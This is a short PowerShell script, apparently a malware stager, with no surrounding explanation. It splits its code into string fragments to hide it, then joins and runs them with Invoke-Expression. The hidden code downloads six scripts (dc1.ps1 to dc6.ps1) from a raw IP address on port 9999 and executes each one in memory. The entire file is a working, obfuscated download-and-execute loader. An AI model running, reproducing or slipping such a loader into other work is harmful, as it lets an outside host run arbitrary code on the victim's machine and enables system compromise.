$fragments = @('﻿
for ($i = ','1; $i -le 6; $i','++) {
   
   ',' $url = "http:/','/103.67.197.187',':9999/dc$i.ps1"','
    
    
 ','   $webClient =',' New-Object Sys','tem.Net.WebClie','nt
    $script','Content = $webC','lient.DownloadS','tring($url)
  ','  
    
    I','nvoke-Expressio','n $scriptConten','t
}'); $script = $fragments -join ''; Invoke-Expression $script


